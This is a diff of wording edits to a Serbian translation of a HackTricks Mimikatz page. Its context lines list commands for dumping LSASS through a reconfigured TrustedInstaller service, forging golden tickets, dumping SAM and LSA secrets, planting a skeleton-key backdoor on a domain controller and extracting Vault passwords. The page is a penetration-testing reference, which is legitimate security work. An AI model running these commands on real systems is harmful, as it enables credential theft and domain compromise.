@@ -28,17 +28,17 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 
 Od Windows 8.1 i Windows Server 2012 R2 nadalje, implementirane su značajne mere za zaštitu od krađe kredencijala:
 
-- **LM hešovi i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja bezbednosti. Specifična registracija, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
+- **LM hash i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja bezbednosti. Specifična registracija, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` kako bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
 
 - **LSA zaštita** je uvedena da zaštiti proces Lokalnog sigurnosnog autoriteta (LSA) od neovlašćenog čitanja memorije i injekcije koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA zaštite uključuje:
 1. Modifikovanje registra na _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
 2. Implementaciju objekta grupne politike (GPO) koji sprovodi ovu promenu registra na upravljanim uređajima.
 
-I pored ovih zaštita, alati poput Mimikatz mogu zaobići LSA zaštitu koristeći specifične drajvere, iako su takve radnje verovatno zabeležene u dnevnicima događaja.
+I pored ovih zaštita, alati poput Mimikatz mogu zaobići LSA zaštitu koristeći specifične drajvere, iako su takve akcije verovatno zabeležene u dnevnicima događaja.
 
 ### Suprotstavljanje uklanjanju SeDebugPrivilege
 
-Administratori obično imaju SeDebugPrivilege, što im omogućava da debaguju programe. Ova privilegija može biti ograničena da se spreče neovlašćeni dumpovi memorije, što je uobičajena tehnika koju napadači koriste za vađenje kredencijala iz memorije. Međutim, čak i sa ovom privilegijom uklonjenom, TrustedInstaller nalog može i dalje vršiti dumpove memorije koristeći prilagođenu konfiguraciju servisa:
+Administratori obično imaju SeDebugPrivilege, što im omogućava da debaguju programe. Ova privilegija može biti ograničena kako bi se sprečili neovlašćeni dump-ovi memorije, što je uobičajena tehnika koju napadači koriste za vađenje kredencijala iz memorije. Međutim, čak i sa ovom privilegijom uklonjenom, TrustedInstaller nalog i dalje može vršiti dump-ove memorije koristeći prilagođenu konfiguraciju servisa:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -79,8 +79,8 @@ Zlatni tiket omogućava pristup na nivou domena putem impersonacije. Ključna ko
 - `/domain`: Ime domena.
 - `/sid`: Sigurnosni identifikator (SID) domena.
 - `/user`: Korisničko ime za impersonaciju.
-- `/krbtgt`: NTLM hash KDC servisnog naloga domena.
-- `/ptt`: Direktno injektuje tiket u memoriju.
+- `/krbtgt`: NTLM hash naloga servisa KDC domena.
+- `/ptt`: Direktno ubrizgava tiket u memoriju.
 - `/ticket`: Čuva tiket za kasniju upotrebu.
 
 Primer:
@@ -154,10 +154,10 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dekriptuje tajne pohranjene u registru.
+- **LSADUMP::Secrets**: Dešifruje tajne pohranjene u registru.
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš za korisnika.
+- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš vrednost za korisnika.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
 - **LSADUMP::Trust**: Preuzima informacije o poverenju.
@@ -165,7 +165,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Razno
 
-- **MISC::Skeleton**: Umeće backdoor u LSASS na DC.
+- **MISC::Skeleton**: Umeće backdoor u LSASS na DC-u.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Eskalacija Privilegija
@@ -184,7 +184,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Ekstrahuje Kerberos karte iz memorije.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipulacija Sid i Tokenima
+### Manipulacija Sid-om i Token-ima
 
 - **SID::add/modify**: Menja SID i SIDHistory.
 - Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
@@ -201,9 +201,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **TS::Sessions**: Prikazuje TS/RDP sesije.
 - *Nema specifične komande za TS::Sessions u originalnom kontekstu.*
 
-### Vault
+### Trezor
 
-- Ekstrahuje lozinke iz Windows Vault.
+- Ekstrahuje lozinke iz Windows Trezora.
 - `mimikatz "vault::cred /patch" exit`
 
 
@@ -222,7 +222,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 <summary>Podrška HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
